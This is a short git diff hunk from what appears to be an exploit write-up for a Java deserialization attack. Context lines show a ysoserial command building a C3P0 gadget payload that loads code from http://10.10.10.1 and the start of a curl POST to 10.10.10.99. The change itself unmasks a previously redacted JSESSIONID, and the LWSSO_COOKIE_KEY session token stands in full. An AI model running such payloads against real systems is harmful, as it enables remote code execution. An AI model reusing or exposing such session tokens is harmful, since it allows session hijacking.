@@ -558,7 +558,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-c3p0-0.9.1.2.jar C3P0 "http://10.10.10.1:
 ```
 
 ```
-COOKIE='Cookie: JSESSIONID=xQJ******************4PA; LWSSO_COOKIE_KEY=mqx8GAJdW7M8dh5bO99hiZjXAgOHmdteaLsy_c9N77F6n2fFB_XWpe0wDHnpG-x2RbOHNm3H7hjHsmYpRc4PPg2ohEFN7duztvJD0M_u3GUcg_YUJPy5c6ewbqi61FRllh0AoNwAb5K-1fN-uRVK0c8yEVVIkBbxn9vxsCEhofRbZNdtnDQMb3WUeb7yInwRAzfPICWMnE5iuJ_TTyTDlw..;'
+COOKIE='Cookie: JSESSIONID=xQJJmHDwOQMlAL93PaLPE4PA; LWSSO_COOKIE_KEY=mqx8GAJdW7M8dh5bO99hiZjXAgOHmdteaLsy_c9N77F6n2fFB_XWpe0wDHnpG-x2RbOHNm3H7hjHsmYpRc4PPg2ohEFN7duztvJD0M_u3GUcg_YUJPy5c6ewbqi61FRllh0AoNwAb5K-1fN-uRVK0c8yEVVIkBbxn9vxsCEhofRbZNdtnDQMb3WUeb7yInwRAzfPICWMnE5iuJ_TTyTDlw..;'
 
 curl -i -s -k -X $'POST' \
   -H $'Host: 10.10.10.99' \
